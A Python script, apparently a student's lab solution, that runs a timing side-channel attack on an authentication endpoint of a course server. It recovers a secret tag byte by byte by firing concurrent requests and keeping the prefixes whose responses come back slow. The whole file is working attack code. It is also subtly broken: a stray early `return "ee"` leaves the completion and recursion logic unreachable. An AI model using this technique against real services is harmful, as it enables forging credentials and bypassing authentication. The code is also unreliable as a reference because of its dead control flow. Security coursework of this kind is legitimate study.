import requests
from requests.exceptions import ConnectionError, Timeout
import time
import concurrent.futures
from statistics import median, fmean

#
#   Globals
#

DEBUG: bool = True
BASE_URL: str = "http://dart.cse.kau.se:12345/auth/"
HTTP_MAX_RETRIES: int = 100
HTTP_RETRY_SLEEP_BASE_IN_SECONDS: float = 0.8
HTTP_RETRY_SLEEP_FACTOR: float = 0.75
HTTP_TIMOUT_FACTOR: float = 1.5
THRESHOLD_LATENCY_FACTOR: float = 0.2
CONCURRENT_WORKERS: int = 4

# ANSI escape codes for text colors
ANSI_RESET = "\033[0m"
ANSI_BLACK = "\033[30m"
ANSI_RED = "\033[31m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_BLUE = "\033[34m"
ANSI_MAGENTA = "\033[35m"
ANSI_CYAN = "\033[36m"
ANSI_WHITE = "\033[37m"

#
#   Classes
#

class Auth:
    url: str
    user: str
    delay: float
    tag: list[int]
    tag_max_length: int
    elapsed_time_threshold: float
    elapsed_time_latency: float
    elapsed_time: float
    status_code: int
    threshold: float

    def __init__(self, user: str, delay: float, tag: list[int], latency: float):
        self.elapsed_time = 0.0
        self.status_code = 0
        self.tag_max_length = 32
        self.latency = latency
        self.user = user
        self.delay = delay
        self.tag = tag

        threshold_base = self._tag_length() * delay + latency
        self.threshold = threshold_base - (latency * THRESHOLD_LATENCY_FACTOR)

        tag_as_string = self.tag_as_string()
        self.url = f"{BASE_URL}{int(delay)}/{user}/{tag_as_string}"

    # If auth is sucessfull return True
    def ok(self) -> bool:
        return self.status_code == 200 or (self.elapsed_time >= self.threshold)
    
    def _tag_length(self) -> int:
        return len([item for item in self.tag if isinstance(item, int)])
    
    def tag_as_string(self) -> str:
        string = ""
        # represent as string
        for hex_value in self.tag:
            if not isinstance(hex_value, int):
                hex_value = 0
            hex_value = hex(hex_value) # convert
            hex_value = hex_value[2:] # remove the two first characters which are "0x"
            hex_value = pad_string_with_zero(hex_value, 2)
            string += hex_value
        # pad string and return
        return pad_string_with_zero(string, self.tag_max_length)

    def run(self) -> None:
        retried: int = 0
        timeout: float = self.threshold + self.latency * HTTP_TIMOUT_FACTOR
        if timeout == 0.0:
            timeout = 30.0

        while retried < HTTP_MAX_RETRIES:
            retry_sleep_time: float = HTTP_RETRY_SLEEP_BASE_IN_SECONDS * HTTP_RETRY_SLEEP_FACTOR * retried
            try:
                start_time = time.time()
                response = requests.get(self.url, timeout=timeout)
                end_time = time.time()
                elapsed_time = (end_time - start_time) * 1000

                self.elapsed_time = elapsed_time
                self.status_code = response.status_code

                if self.ok() or DEBUG:
                    color = ANSI_GREEN if self.ok() else ANSI_RESET
                    print(f'{color}0x{self.tag_as_string()} took {"{:.2f}".format(self.elapsed_time)} ({"{:.2f}".format(self.threshold)})')

                return None
            except ConnectionError as e:
                if DEBUG:
                    print(f"{ANSI_RED}Connection failed {e}{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break
            except Timeout as e:
                print(f"{ANSI_RED}Timeout of {timeout} ms exceeded.{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break

        # Failed!
        return None

#
#   Static functions
#

def pad_string_with_zero(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def full_byte_range_with_prefix(prefix: list[int]) -> list[list[int]]:
    list_of_list = []
    for x in range(256):
        p = prefix.copy()
        p.append(x)
        list_of_list.append(p)
    return list_of_list

def run(user: str, delay: float, tag_prefix: list[int]) -> str:
    # Test latency to get a base value
    latencies: list[float] = []
    for _ in range(4):
        latency_test: Auth = Auth("", 0, [], 1000.0)
        latency_test.run()
        latencies.append(latency_test.elapsed_time)
    latency: float = fmean(latencies)

    # Prepare tasks
    auths: list[Auth] = []
    for tag in full_byte_range_with_prefix(tag_prefix):
        auths.append(Auth(user, delay, tag, latency))

    # Keep going if either:
    #   * there are no attempts (first iteration)
    #   * there are no sucessfull auths
    #   * there are more than one ok tag prefixes
    while len([x for x in auths if x.ok()]) != 1:
        print(f"{ANSI_YELLOW}Testing {len(auths)} tag prefixes{ANSI_RESET}")
        with concurrent.futures.ThreadPoolExecutor(CONCURRENT_WORKERS) as executor:
            uncompleted_futures = []
            for auth in auths:
                uncompleted_futures.append(executor.submit(auth.run))
            concurrent.futures.wait(uncompleted_futures)
            auths = [x for x in auths if x.ok()]
    
    return "ee"
    if auths[0].status_code == 200:
        # Done
        print("Completed!")
        print(auths)
        return auths[0].url
    else:
        # Continue with next tag prefix
        return run(user, delay, auths[0].tag)

#
#   Main
#

if __name__ == "__main__":
    user: str = "oscaande104"
    delay: float = float(100)
    print(f"Done!\nurl={run(user, delay, [])}")